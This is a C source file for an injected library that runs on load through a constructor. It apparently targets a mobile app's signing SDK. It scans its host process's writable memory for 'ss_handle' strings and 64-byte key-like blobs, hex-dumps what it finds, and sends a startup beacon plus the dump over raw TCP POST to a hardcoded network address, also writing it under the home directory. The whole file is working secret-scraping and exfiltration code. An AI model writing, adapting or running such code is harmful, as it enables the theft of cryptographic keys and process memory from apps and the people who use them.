// xhs_probe.c v5 —— 优化版启发式扫描：廉价预筛 + 限时 + 找到就发
// 目标：找 {u32 mode(0..15), key[64]} 或 "ss_handle"

typedef unsigned int        u32;
typedef unsigned long long  u64;
typedef unsigned long       usize;

extern void *malloc(usize);
extern void  free(void *);
extern void *memcpy(void *, const void *, usize);
extern void *memset(void *, int, usize);
extern usize strlen(const char *);
extern char *getenv(const char *);
extern int   getpid(void);
extern unsigned int sleep(unsigned int);
extern int   snprintf(char *, usize, const char *, ...);
extern int   open(const char *, int, ...);
extern long  write(int, const void *, usize);
extern int   close(int);
extern int   socket(int, int, int);
extern int   connect(int, const void *, unsigned int);
extern long  send(int, const void *, usize, int);
extern int   pthread_create(void *, const void *, void *(*)(void *), void *);

typedef u32 mach_port_t;
typedef int kern_return_t;
typedef u64 mach_vm_address_t;
typedef u64 mach_vm_size_t;
typedef u32 mach_msg_type_number_t;

extern mach_port_t mach_task_self_;
extern kern_return_t mach_vm_region(mach_port_t, mach_vm_address_t *, mach_vm_size_t *,
                                    int, void *, mach_msg_type_number_t *, mach_port_t *);
extern kern_return_t mach_port_deallocate(mach_port_t, mach_port_t);
extern kern_return_t vm_read_overwrite(mach_port_t, mach_vm_address_t, mach_vm_size_t,
                                       mach_vm_address_t, mach_vm_size_t *);

struct vm_region_basic_info_64 {
    int  protection, max_protection;
    u32  inheritance;
    int  shared, reserved;
    u64  offset;
    int  behavior;
    unsigned short user_wired_count;
};

#define VM_REGION_BASIC_INFO_64        9
#define VM_REGION_BASIC_INFO_COUNT_64  9
#define VM_PROT_WRITE                  2
#define KERN_SUCCESS                   0
#define MACH_PORT_NULL                 0

struct sockaddr_in_x {
    unsigned char sin_len, sin_family;
    unsigned short sin_port;
    u32 sin_addr;
    char pad[8];
};

#define AF_INET_X     2
#define SOCK_STREAM_X 1
#define OUT_HOST      0xFE00A8C0u
#define OUT_PORT_H    0x981Fu
#define CHUNK         (256u * 1024)
#define MAX_REGION    (64ull * 1024 * 1024)     /* 只扫 <64MB 的区 */
#define MAX_CHUNKS    1600                      /* 上限 400MB */
#define MAX_CAND      16
#define CAND_CTX      160

static char *g_buf;
static usize g_len, g_cap;
static int   g_cand, g_chunks;
static int   g_sdk, g_sskey;

static void buf_init(void) { g_cap = 1u << 20; g_buf = (char *)malloc(g_cap); g_len = 0;
                             if (g_buf) g_buf[0] = 0; }
static void buf_add(const char *s, usize n) {
    if (!g_buf) return;
    if (g_len + n + 1 >= g_cap) return;
    memcpy(g_buf + g_len, s, n); g_len += n; g_buf[g_len] = 0;
}
static void buf_str(const char *s) { buf_add(s, strlen(s)); }
static void buf_hex(const unsigned char *p, usize n) {
    static const char *H = "0123456789abcdef";
    char line[96];
    usize i, j, k;
    for (i = 0; i < n; i += 16) {
        k = 0; line[k++] = ' ';
        for (j = 0; j < 16 && i + j < n; j++) {
            unsigned char c = p[i + j];
            line[k++] = H[c >> 4];
            line[k++] = H[c & 15];
            line[k++] = (j == 7) ? '-' : ' ';
        }
        line[k++] = '\n';
        buf_add(line, k);
        if (g_len > g_cap - 4096) return;
    }
}

static void tcp_send(const char *tag, const char *body, usize n) {
    int fd; struct sockaddr_in_x a; char head[256]; int hl; usize off = 0;
    fd = socket(AF_INET_X, SOCK_STREAM_X, 0);
    if (fd < 0) return;
    memset(&a, 0, sizeof(a));
    a.sin_len = (unsigned char)sizeof(a);
    a.sin_family = AF_INET_X;
    a.sin_port = OUT_PORT_H;
    a.sin_addr = OUT_HOST;
    if (connect(fd, (const void *)&a, (unsigned int)sizeof(a)) == 0) {
        hl = snprintf(head, sizeof(head),
                      "POST /%s HTTP/1.1\r\nHost: x\r\nContent-Length: %lu\r\n"
                      "Connection: close\r\n\r\n", tag, (unsigned long)n);
        send(fd, head, (usize)hl, 0);
        while (off < n) {
            long w = send(fd, body + off, n - off, 0);
            if (w <= 0) break;
            off += (usize)w;
        }
    }
    close(fd);
}

static void write_file(const char *text) {
    const char *home = getenv("HOME");
    char path[512]; int fd; usize n, off = 0;
    if (!home) return;
    snprintf(path, sizeof(path), "%s/tmp/xhs_dump.txt", home);
    fd = open(path, 1 | 0x200 | 0x400, 0644);
    if (fd < 0) return;
    n = strlen(text);
    while (off < n) { long w = write(fd, text + off, n - off); if (w <= 0) break; off += (usize)w; }
    close(fd);
}

/* 严格判定：64 字节必须像随机密钥，不能像指针表 */
static int pre_ok(const unsigned char *p) {
    int i, d = 0, run = 0, maxrun = 0, low = 0, high = 0, zero = 0;
    unsigned char seen[256];
    memset(seen, 0, sizeof(seen));
    for (i = 0; i < 64; i++) {
        if (!seen[p[i]]) { seen[p[i]] = 1; d++; }
        if (p[i] >= 0x20 && p[i] < 0x7f) { if (++run > maxrun) maxrun = run; } else run = 0;
        if (p[i] >= 0x80) high++;
        if (p[i] == 0) zero++;
    }
    for (i = 0; i + 4 <= 64; i += 4) {
        u32 v;
        memcpy(&v, p + i, 4);
        if (v <= 2) low++;
    }
    if (low >= 2) return 0;        /* 指针表特征：满是小整数 */
    if (zero >= 10) return 0;
    if (maxrun > 10) return 0;
    if (high < 18 || high > 48) return 0;
    return (d >= 30);
}

/* 诊断：这 64 字节里是否含可读 ASCII 串片段 */
static void *worker(void *arg) {
    const char needle[10] = {'s','s','_','h','a','n','d','l','e',0};
    const usize nlen = 9;
    mach_vm_address_t addr = 0;
    char tmp[256];
    char *scratch;
    int rounds = 0;
    int sent = 0;

    (void)arg;
    buf_init();
    if (!g_buf) return 0;
    scratch = (char *)malloc(CHUNK);
    if (!scratch) return 0;

    buf_str("=== xhs_probe v7 ===\n");
    {
        const char *home = getenv("HOME");
        snprintf(tmp, sizeof(tmp), "home=%s\npid=%d\n", home ? home : "(null)", getpid());
        buf_str(tmp);
    }

    while (rounds < 8000) {
        mach_vm_size_t size = 0;
        struct vm_region_basic_info_64 info;
        mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
        mach_port_t obj = MACH_PORT_NULL;
        kern_return_t kr;
        mach_vm_size_t off;

        rounds++;
        memset(&info, 0, sizeof(info));
        kr = mach_vm_region(mach_task_self_, &addr, &size, VM_REGION_BASIC_INFO_64,
                            (void *)&info, &cnt, &obj);
        if (obj != MACH_PORT_NULL) mach_port_deallocate(mach_task_self_, obj);
        if (kr != KERN_SUCCESS) break;
        if (size == 0) break;

        if ((info.protection & VM_PROT_WRITE) && size < MAX_REGION) {
            for (off = 0; off < size && g_cand < MAX_CAND; off += CHUNK) {
                mach_vm_size_t want = size - off, got = 0;
                usize i;
                if (want > CHUNK) want = CHUNK;
                kr = vm_read_overwrite(mach_task_self_, addr + off, want,
                                       (mach_vm_address_t)(usize)scratch, &got);
                if (kr != KERN_SUCCESS || got == 0) continue;
                g_chunks++;

                /* 统计 SDK 痕迹 */
                for (i = 0; i + 12 < (usize)got; i++) {
                    if (scratch[i] == 'X' && scratch[i+1] == 'Y' && scratch[i+2] == 'S' &&
                        scratch[i+3] == 'S' && scratch[i+4] == 'H') { g_sdk++; }
                    else if (scratch[i] == 's' && scratch[i+1] == 's' && scratch[i+2] == '_') { g_sskey++; }
                }

                for (i = 0; i + 72 < (usize)got && g_cand < MAX_CAND; i += 4) {
                    u32 mode;
                    /* 字面量优先 */
                    if (scratch[i] == 's') {
                        usize k = 0;
                        while (k < nlen && (unsigned char)scratch[i + k] == (unsigned char)needle[k]) k++;
                        if (k == nlen) {
                            g_cand++;
                            snprintf(tmp, sizeof(tmp), "\n=== SS_HANDLE @ 0x%llx ===\n",
                                     (unsigned long long)(addr + off + i));
                            buf_str(tmp);
                            buf_hex((const unsigned char *)(scratch + i), 96);
                            continue;
                        }
                    }
                    memcpy(&mode, scratch + i, 4);
                    if (mode > 15) continue;
                    if (!pre_ok((const unsigned char *)(scratch + i + 4))) continue;
                    /* 再确认前 4 字节确实是 0..15 的小整数内存布局 */
                    if (scratch[i + 2] | scratch[i + 3]) continue;
                    {
                        usize s0 = (i > CAND_CTX) ? (usize)(i - CAND_CTX) : 0;
                        usize e0 = i + 68 + CAND_CTX;
                        g_cand++;
                        snprintf(tmp, sizeof(tmp),
                                 "\n=== CAND %d mode=%u @ 0x%llx (region 0x%llx +0x%llx) ===\n",
                                 g_cand, mode, (unsigned long long)(addr + off + i),
                                 (unsigned long long)addr, (unsigned long long)(off + i));
                        buf_str(tmp);
                        if (e0 > (usize)got) e0 = (usize)got;
                        buf_hex((const unsigned char *)(scratch + s0), e0 - s0);
                    }
                }
                if (g_len > g_cap - 8192) break;
            }
        }
        addr += size;
        if (addr == 0) break;
        if (g_chunks > MAX_CHUNKS) break;
        if (g_len > g_cap - 8192) break;
    }

    snprintf(tmp, sizeof(tmp), "\n=== done cands=%d chunks=%d sdk_str=%d ss_keys=%d ===\n",
             g_cand, g_chunks, g_sdk, g_sskey);
    buf_str(tmp);

    tcp_send("PROBE2", g_buf, g_len);
    write_file(g_buf);
    free(scratch);
    return 0;
}

__attribute__((constructor))
static void xhs_probe_main(void) {
    char b[160];
    const char *h = getenv("HOME");
    snprintf(b, sizeof(b), "BOOT v6 pid=%d home=%s", getpid(), h ? h : "?");
    tcp_send("BOOT", b, strlen(b));
    worker(0);
}
